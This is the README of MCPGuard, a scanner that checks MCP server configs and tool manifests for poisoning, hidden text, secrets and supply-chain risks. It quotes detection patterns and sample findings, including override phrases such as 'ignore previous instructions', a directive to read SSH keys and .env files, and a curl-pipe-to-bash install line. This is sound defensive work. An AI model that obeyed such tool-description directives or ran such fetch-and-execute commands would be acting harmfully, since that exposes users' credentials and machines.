# MCPGuard

**A security scanner for Model Context Protocol (MCP) servers — the `npm audit` for MCP.**

MCP is how agents get hands: filesystem access, databases, shells, SaaS APIs. Adoption
ran far ahead of review — teams paste a server config into Claude Desktop, Cursor, or
VS Code and the agent starts executing tool calls with the developer's full local
privileges. There is no `npm audit` for that decision.

MCPGuard is that missing check. Point it at an MCP server — a client config, a tool
manifest, or a live STDIO connection — and it produces a graded, framework-mapped
security report with a CI exit-code gate.

```bash
$ mcpguard scan samples/05-tool-poisoning-manifest.json
MCPGuard scan — 1 target(s)

● server: notes-pro
  CRITICAL TP01  Possible data-exfiltration directive in tool metadata
           └ server=notes-pro tool=get_context field=description
           evidence: read ~/.ssh/id_rsa and the .env
           refs: OWASP-LLM01, MCP-TOOL-POISONING
           fix: This field appears to instruct the model to send data to an external
                destination or read sensitive files. Treat the server as untrusted.
  HIGH     TP02  Hidden or invisible content in tool metadata
           └ server=notes-pro tool=get_context field=description
           evidence: invisible characters present: U+200B, U+200D
  ...
  7 finding(s): 4 high, 2 critical, 1 medium

Summary: 1 target(s), 7 finding(s) — 2 critical, 4 high, 1 medium — FAIL (gate >= high)
$ echo $?
1
```

---

## Contents

- [Why this exists](#why-this-exists)
- [What it detects](#what-it-detects)
- [Install](#install)
- [Usage](#usage)
- [CI integration](#ci-integration)
- [Web dashboard](#web-dashboard)
- [Architecture](#architecture)
- [Adding a rule](#adding-a-rule)
- [Samples](#samples)
- [Development](#development)
- [Status and roadmap](#status-and-roadmap)

---

## Why this exists

### MCP is a new class of attack surface

An MCP server advertises *tools* to a model: a name, a natural-language description,
and a JSON input schema. The model reads that description and decides when to call the
tool. Two properties make this unlike any prior integration:

**The description is executable input.** Tool text goes straight into the model's
context. Text that reads as documentation to a human reads as an instruction to a
model. There is no privilege boundary between "describing a tool" and "commanding the
agent."

**The STDIO transport spawns local processes.** A config line like
`npx -y some-mcp-server` fetches the *latest* published package and executes it on the
developer's machine, in their shell, with their credentials, on every launch.

### The 2026 picture

- **40+ CVEs** disclosed against MCP implementations Jan–Apr 2026, including a
  by-design STDIO/subprocess flaw enabling RCE.
- Tool poisoning and indirect prompt injection found **systemically across 9 of 11**
  surveyed MCP marketplaces, affecting packages with 150M+ downloads.
- Prompt injection is **OWASP LLM01** for a second edition running; the OWASP Top 10
  for Agentic Applications centers **excessive agency** — agents holding more tools and
  permissions than their task requires.
- GitGuardian counted **29M new hardcoded secrets in 2025** (+34% YoY), 1.27M tied to
  AI services (+81%). MCP configs are a fresh, unscanned home for exactly those keys.
- **230+ malicious npm/PyPI packages** confirmed in February 2026 alone — against an
  MCP install convention that is unpinned by default.

### Why existing tooling doesn't cover it

| Existing control | What it misses for MCP |
|---|---|
| SAST / linters | Analyze code. MCP's primary payload is *prose in a JSON manifest* — no code to parse. |
| Secret scanners | Scan repos and commits. MCP client configs live in `~/Library/Application Support/…`, outside version control. |
| SCA / dependency audit | Reads lockfiles. `npx -y pkg` has no lockfile — resolution happens at agent launch. |
| LLM guardrails / prompt firewalls | Filter runtime conversation. Poisoning is injected at *tool registration*, before any user turn. |

MCPGuard occupies the pre-flight gap: between "someone added a server to the config"
and "the agent trusts it."

---

## What it detects

Seven independently registered rules, each mapped to a recognized framework so findings
survive a compliance conversation.

| ID | Severity | Detects | Maps to |
|----|----------|---------|---------|
| **TP01** | High–Critical | **Tool poisoning / prompt injection.** Instruction directives (`ignore previous instructions`, `do not tell the user`) and data-exfiltration hints (`send … to https://…`, `read ~/.ssh`) in tool descriptions, **parameter descriptions**, server instructions, prompt and resource text. | OWASP LLM01 · MCP tool poisoning |
| **TP02** | Medium–High | **Hidden content.** Zero-width characters, BiDi overrides (including the classic U+202E spoof), and HTML comments — text the model reads and the human reviewer cannot see. | OWASP LLM01 |
| **CAP01** | Medium–High | **Excessive agency.** Infers capability from tool name and description across six classes — code execution, shell, filesystem write, arbitrary network, credential access, database mutation. A dangerous verb in the tool *name* escalates severity. | OWASP Agentic — Excessive Agency |
| **CMD01** | High | **RCE sinks in server source.** When the server's source is locatable on disk: `shell=True`, `os.system`, `os.popen`, `eval`/`exec`, `child_process.exec`, `new Function`, `curl … \| sh`. Reported per file and line. | MCP STDIO RCE · CWE-78 |
| **SEC01** | High–Critical | **Plaintext secrets in config `env`.** Seven high-confidence vendor formats (OpenAI, Anthropic, GitHub, AWS, Slack, Google, PEM private keys) plus a name-and-value heuristic, with placeholder and `${VAR}` suppression. Evidence is redacted. | CWE-798 |
| **SUP01** | Medium–High | **Supply-chain exposure.** Unpinned `npx`/`uvx`/`pipx`/`bunx` launches, and the worst case — fetch-and-execute of code from a remote URL or git ref at launch. | MCP supply chain · SLSA provenance |
| **MAN01** | High | **Rug pull / manifest drift** *(dynamic, `--connect`)*. Diffs the live server's enumerated tools against the reviewed baseline: tools that appeared post-approval, and descriptions that changed since review. | MCP rug-pull · manifest drift |

> **Design bias: precision over recall.** A scanner in a CI gate that cries wolf gets
> the gate removed within a sprint. So placeholders are suppressed, secrets are matched
> on vendor formats before name heuristics, and inference-based rules (`CAP01`) carry an
> explicit `confidence: 0.7` rather than posing as certainty.

### Inputs accepted

The parser dispatches on structure — you never declare a format:

- `{"mcpServers": {…}}` — Claude Desktop, Cursor
- `{"servers": {…}}` — VS Code
- `{"command": …}` or `{"url": …}` — a single inline server object
- `{"tools": […], "instructions": "…"}` — a bare tool manifest, so an enumeration
  captured elsewhere can be analyzed offline

Transport is inferred (declared `type` wins → `command` means STDIO → a URL ending in
`sse` means SSE → else HTTP). The server's on-disk source is resolved best-effort from
`source_path`, `cwd`, or the first argument pointing at an existing file — which is what
unlocks `CMD01` without asking you for anything extra.

---

## Install

```bash
cd mcpguard
pip install -e .                # static scanning — no third-party deps
pip install -e ".[connect]"     # + live --connect support (MCP SDK)
pip install -e ".[dev]"         # + pytest, mypy, ruff
```

Requires Python ≥ 3.10. **The core library and CLI are pure stdlib.** A security tool
that drags in a dependency tree is a supply-chain liability inside the very pipeline it
is meant to protect.

---

## Usage

```bash
mcpguard scan path/to/mcp-config.json
mcpguard scan manifest.json --format json
mcpguard scan config.json --min-severity critical    # gate only on criticals
mcpguard scan config.json --connect                  # enumerate the live server
mcpguard scan config.json --no-color
```

### Exit codes

| Code | Meaning |
|------|---------|
| `0` | Clean — no finding at or above the gate |
| `1` | Gate failed — a finding met or exceeded `--min-severity` (default `high`) |
| `2` | Usage or IO error — unreadable file, bad JSON, unrecognized config shape |

Distinguishing `1` from `2` matters: a broken config should not read as a security
failure, and a security failure should not read as a broken config.

### JSON output

Stable schema, designed to be consumed rather than read. `ok` is the gate signal.

```json
{
  "tool": "mcpguard",
  "version": "0.1.0",
  "gate": "high",
  "ok": false,
  "summary": { "targets": 2, "total_findings": 2, "by_severity": { "high": 2 } },
  "results": [
    {
      "target": "quickstart",
      "summary": { "total": 1, "by_severity": { "high": 1 }, "max_severity": "high" },
      "findings": [
        {
          "rule_id": "SUP01",
          "title": "MCP server fetches code from a remote URL at launch",
          "severity": "high",
          "category": "supply_chain",
          "location": { "server": "quickstart", "field": "command" },
          "evidence": "bash -c curl -fsSL https://get.example-mcp.dev/install.sh | bash",
          "remediation": "Do not fetch-and-execute remote code at launch. Vendor the server, pin a version, and verify its integrity (hash / signature).",
          "mappings": ["MCP-SUPPLY-CHAIN", "SLSA-PROVENANCE"],
          "confidence": 1.0
        }
      ]
    }
  ]
}
```

Runs are deterministic: rules execute in sorted-id order and findings sort stably by
(−severity, rule id), so two runs over the same input produce byte-identical JSON and
diffs between runs are meaningful.

### As a library

```python
from mcpguard.scanner import scan_file
from mcpguard.models import Severity

reports = scan_file("mcp-config.json")
for report in reports:
    if report.failed(Severity.HIGH):
        print(report.target, report.counts())
```

---

## CI integration

```yaml
- run: pip install mcpguard
- run: mcpguard scan .mcp/config.json --min-severity high --format json
  # job fails (exit 1) if any high/critical finding is present
```

The gate runs at config-change time — the point where remediation is a one-line edit
rather than an incident.

---

## Web dashboard

`mcpguard-web/` is a Next.js 16 / React 19 application with three capabilities.

```bash
cd mcpguard-web
npm install
npm run dev        # http://localhost:3000
```

**Client-side scanning.** The rule engine is a TypeScript port of the Python engine that
runs in the browser. Nothing is uploaded — the only defensible design, since the inputs
are config files that may contain live API keys.

**Parity testing.** `lib/scanner/engine.test.ts` locks the TS engine's output to the
Python engine's on shared fixtures. Two implementations of one detection contract are a
liability unless drift is caught mechanically; here it is.

**Registry browser.** `GET /api/registry` proxies the official MCP registry, dedupes to
the latest active version per server, and synthesizes a realistic scannable config for
each — `npx -y <pkg>` unpinned exactly as the published install docs write it, secrets
as `${VAR}` references. You scan *real public servers* in two clicks, so findings
reflect real-world setups rather than contrived demos.

### Scan API

```bash
curl -X POST http://localhost:3000/api/scan \
  -H 'Content-Type: application/json' \
  -d '{"config": "<MCP config JSON as a string>", "gate": "high"}'
```

Returns the same report schema as the CLI. The `ok` field and the `X-MCPGuard-OK`
response header carry the gate signal, so the API is a drop-in CI target for teams that
would rather call a service than install a package. `400` on bad input, `500` on an
internal scan error — never a silent pass.

---

## Architecture

### System shape

```
  INPUT                    ENGINE                        OUTPUT
  ─────                    ──────                        ──────
  Claude Desktop /  ┐
  Cursor config     │
  VS Code config    ├──▶ config_parser ──▶ MCPServerSpec[] ─┐
  Inline server obj │      (shape dispatch)                 │
  Tool manifest     ┘                                       │
                                                            ▼
  Live STDIO server ──▶ Connector ──▶ MCPManifest ──▶ AnalysisContext
                        (optional)                          │
                                                            ▼
                                              ┌─── Rule registry ───┐
                                              │ TP01 TP02 CAP01     │
                                              │ CMD01 SEC01 SUP01   │
                                              │ MAN01 (dynamic)     │
                                              └──────────┬──────────┘
                                                         ▼
                                              scanner (error isolation)
                                                         │
                                          ┌──────────────┴───────────────┐
                                          ▼                              ▼
                                 text reporter (ANSI)          json reporter
                                          │                              │
                                          ▼                              ▼
                                   human review                CI gate · exit 0/1/2
```

### Module layout

```
mcpguard/src/mcpguard/
  models.py         # immutable domain + finding types — the stable contract
  patterns.py       # every detection signature, curated in one place
  context.py        # per-scan shared state: source IO, live manifest
  config_parser.py  # config/manifest JSON → MCPServerSpec targets
  rules/
    base.py         # Rule ABC + self-registration registry
    tool_poisoning.py  hidden_content.py  excessive_agency.py
    command_injection.py  secrets.py  pinning.py
  dynamic/
    connector.py    # live-connection adapters (Recorded / SDK-STDIO)
    drift.py        # MAN01 rug-pull rule
  reporting/        # text (ANSI) + JSON reporters behind one dispatch
  scanner.py        # orchestration: rules × targets, failure isolation
  cli.py            # argparse entry point + exit-code gate

mcpguard-web/
  app/page.tsx              # header + dashboard + rule catalog
  app/api/scan/route.ts     # POST /api/scan
  app/api/registry/route.ts # GET  /api/registry (official MCP registry proxy)
  components/               # Dashboard, FindingCard, RegistryBrowser, ServerInventory
  lib/scanner/              # the TS engine: types, patterns, rules, configParser, scan
  lib/registry.ts           # registry record → scannable config synthesis
```

### The five decisions that matter

**1. Zero-dependency core.** The scanner and CLI are pure Python stdlib. The MCP SDK is
an optional `[connect]` extra, imported lazily and only when `--connect` is passed. It
installs anywhere, starts fast, and its own attack surface is auditable in an afternoon.

**2. Rules are stateless, self-registering plugins.** Each detector subclasses `Rule`,
declares its identity as class attributes, and implements one method that yields
findings. A `@register` decorator adds it to the registry at import time. Adding a rule
touches exactly two files — the new module and one import line. The rule set *is* the
product; it must be cheap to grow as the threat landscape moves.

**3. Side effects live behind two seams.** Rules never touch the filesystem or the
network directly. Disk reads go through `AnalysisContext` — cached per source root,
capped at 1 MB per file, skipping `node_modules`, `.git`, `__pycache__` and friends.
Live connections go through the `Connector` protocol, which has a real SDK-STDIO
implementation and a `RecordedConnector` that replays a fixed manifest. The consequence:
*every rule is a pure function under test* — no fixtures on disk, no live process, no
network. That is what makes 98% coverage achievable rather than aspirational.

**4. A misbehaving rule degrades; it does not abort.** The scanner wraps each rule
invocation. An exception becomes an `INFO` finding with `confidence: 0.0` and the scan
continues. A failed live connection does the same. One broken detector must never deny
coverage of the other six — in a CI gate, a crash that reads as "no findings" is worse
than the finding it swallowed.

**5. Manifest source is abstracted from the rules that read it.**
`ctx.effective_manifest(spec)` returns the live manifest when connected and the declared
one otherwise. Metadata rules analyze whichever is authoritative without knowing how it
arrived — which is why `--connect` upgrades the fidelity of *every* metadata rule at
once, not just the drift rule.

### Data model

`models.py` is the contract every other component depends on; the JSON schema derives
from it directly.

| Type | Role and notable design choice |
|---|---|
| `Severity` | `IntEnum` (INFO 0 → CRITICAL 4). Ordered on purpose: the CI gate is the single comparison `finding.severity >= threshold`. |
| `Category` | `str, Enum` — JSON-serializable and comparable against plain strings in tests without ceremony. |
| `Location` | Frozen. All fields optional: `server`, `tool`, `field`, `path`, `line`. Each rule fills in what it can pinpoint. |
| `Finding` | Frozen and hashable — deduplicable and deterministically comparable. Carries `evidence`, `remediation`, framework `mappings`, and a validated `confidence` in [0, 1]. |
| `Report` | Owns the gate logic: `failed(threshold)`, `exit_code()`, `counts()`, and a stable `sorted()`. |
| `MCPServerSpec` | One scan target however declared — `command`/`args`/`env` for STDIO, `url` for remote, plus optional `source_path` and `manifest`. |
| `MCPTool` | Exposes `parameter_descriptions`, walking the JSON input schema so parameter text is scanned as first-class attack surface — a commonly missed poisoning vector. |

---

## Adding a rule

Write the module, import it from `rules/__init__.py`, and it's live — the scanner
discovers it.

```python
from mcpguard.rules.base import Rule, register
from mcpguard.models import Category, Severity

@register
class MyRule(Rule):
    id = "MYRULE"
    title = "..."
    category = Category.SUPPLY_CHAIN
    default_severity = Severity.MEDIUM
    mappings = ("SOME-FRAMEWORK-REF",)

    def analyze(self, target, ctx):
        if ...:
            yield self.finding(location=..., evidence=..., remediation=...)
```

Detection signatures belong in `patterns.py`, not inline in the rule — so they can be
reviewed, tuned, and unit-tested in one place, and reused across rules without
divergence. If the rule needs a live connection, set `kind = RuleKind.DYNAMIC` and it
will be excluded from default (offline, hermetic) scans.

---

## Samples

Six configs in `samples/` exercise the full range end to end. They double as the fixture
set for the dashboard's demo buttons.

| File | What it demonstrates |
|---|---|
| `01-real-official-servers.json` | Real official servers as people actually configure them |
| `02-best-practice-pinned.json` | The same servers done right — pinned versions, `${ENV}` refs. Passes clean |
| `03-hardcoded-secrets.json` | Live-looking keys pasted into `env` → SEC01 critical + SUP01 |
| `04-remote-fetch-launch.json` | `curl … \| bash` at launch → SUP01 high |
| `05-tool-poisoning-manifest.json` | The classic poisoning attack → TP01 ×5, TP02 ×2 |
| `06-excessive-agency-manifest.json` | Over-scoped tools → CAP01 |

Key values in `03` are **fake but format-valid** (the AWS pair is the canonical AWS
documentation example). They exist to exercise `SEC01`; they are not credentials.

---

## Development

```bash
# Python engine
cd mcpguard
pytest --cov=mcpguard --cov-report=term-missing    # 124 tests, 98% coverage
mypy            # strict, clean
ruff check .    # clean

# Web
cd mcpguard-web
npm run test        # vitest — 28 tests, includes Python/TS engine parity
npm run typecheck
npm run lint
npm run build
```

| Control | Standard held |
|---|---|
| Unit tests (Python) | 124 tests across 9 modules — models, parser, context, each rule, scanner isolation, reporting, dynamic connector and drift, CLI exit codes. 98% branch coverage. |
| Cross-engine parity | Vitest pins the TypeScript engine to the Python engine on shared fixtures. |
| Type checking | `mypy --strict`, clean, across the whole package. |
| Linting | `ruff`, clean, 100-column line length. |
| Determinism | Sorted rule execution, stable finding sort. Byte-identical JSON across runs. |
| Bounded execution | 1 MB per-file cap, cached source reads, skipped vendor dirs, 30s connect timeout, 12s registry-proxy timeout. |

---

## Status and roadmap

**Beta.** The static rule set is production-usable today. Dynamic `--connect` enumerates
live STDIO servers through the MCP SDK.

| Next | Rationale |
|---|---|
| HTTP / SSE live transport | Remote MCP servers are the fastest-growing deployment shape; today only STDIO can be enumerated live. |
| Signature / provenance verification (`SUP01+`) | Pinning bounds the risk; provenance verification closes it. Natural pairing with SLSA attestations. |
| Per-rule allow-list tuning | A shell tool is not a finding in a shell server. Suppression *with justification* is what keeps a gate alive past its first quarter. |
| SARIF output | Puts findings in the GitHub code-scanning UI with no bespoke integration work. |

---

## License

MIT
